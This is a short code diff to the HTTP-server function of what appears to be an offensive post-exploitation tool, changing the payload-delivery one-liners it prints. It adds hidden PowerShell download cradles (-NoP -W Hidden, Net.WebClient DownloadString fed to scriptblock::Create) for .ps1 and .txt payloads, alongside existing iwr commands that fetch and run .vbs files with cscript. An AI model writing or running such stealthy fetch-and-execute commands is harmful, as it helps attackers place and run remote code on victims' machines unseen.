@@ -718,7 +718,16 @@ def _start_http_server(port, lhost='', filename=''):
         elif ext == '.vbs':
             oneliner = f"iwr '{url}' -OutFile {dest}; cscript //nologo {dest}"
         elif ext == '.ps1':
-            oneliner = f"iex(iwr '{url}').Content"
+            oneliner = (
+                f"powershell -NoP -W Hidden -C \"&([scriptblock]::Create("
+                f"(New-Object Net.WebClient).DownloadString('{url}')))\""
+            )
+        elif ext == '.txt':
+            oneliner = (
+                f"powershell -NoP -W Hidden -C "
+                f"\"&([scriptblock]::Create("
+                f"(New-Object Net.WebClient).DownloadString('{url}')))\""
+            )
         else:
             oneliner = f"iwr '{url}' -OutFile {dest}"
         print(f"  {DM}Deliver:{RS}  {C}{oneliner}{RS}")
